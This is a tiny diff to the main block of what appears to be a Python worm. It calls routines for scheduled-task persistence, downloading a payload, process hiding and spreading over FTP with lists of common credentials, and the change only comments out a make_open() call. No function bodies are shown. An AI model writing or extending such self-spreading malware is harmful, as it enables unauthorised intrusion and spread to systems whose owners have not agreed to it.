@@ -339,6 +339,6 @@ if __name__ == "__main__":
     persist_schtasks()
     download_payload()
     setup_ftp_server(common_users, common_pass)
-    make_open()
+    # make_open()
     hide_process()
     ftp_spread(common_users, common_pass)
